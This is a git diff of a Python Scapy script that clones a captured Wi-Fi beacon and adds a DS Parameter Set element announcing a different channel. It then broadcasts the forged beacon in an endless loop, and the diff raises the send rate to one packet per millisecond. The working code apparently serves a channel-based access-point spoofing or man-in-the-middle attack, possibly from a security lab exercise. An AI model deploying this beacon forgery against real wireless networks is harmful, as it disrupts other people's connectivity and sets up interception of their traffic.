@@ -35,20 +35,22 @@ print("Actual Channel : ", pktSource[Dot11Beacon].network_stats().get("channel")
 
 channel = pktSource[Dot11Beacon].network_stats().get("channel")
 #print(ls(pktSource))
-#newPkt = pktSource.copy()
+newPkt = pktSource.copy()
 #newPkt[Dot11Elt].payload.payload.info = chr((channel + 6) % 11)
-#p = newPkt[Dot11Elt].payload
+#p = pktSource[Dot11Elt].payload
+#last = Dot11Elt(pktSource[Dot11Elt])
 #while isinstance(p, Dot11Elt):
-#    print("one")
 #    if p.ID == 3:
-#        p.info = )
+#        p = p.payload
 #        break
+#    print(p.ID, " : ", p.info, " : ", p.len)
+#    last /= Dot11Elt(ID=p.ID, info=p.info, len=p.len)
 #    p = p.payload
-#
-#print(ls(newPkt))
+
+#newPkt[Dot11Elt] = last/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))/p
+newPkt = newPkt/Dot11Elt(ID="DSset", info=chr((channel + 6)%13))
 #print(pktSource.show())
 #print(newPkt.show())
-newPkt = pktSource/Dot11Elt(ID="DSset", info=chr((channel + 6)%12))
 newChannel = newPkt[Dot11Beacon].network_stats().get("channel")
 print("New Channel : ", newChannel)
-sendp(newPkt, inter=0.1,loop=1, iface=interface)
+sendp(newPkt, inter=0.001,loop=1, iface=interface)
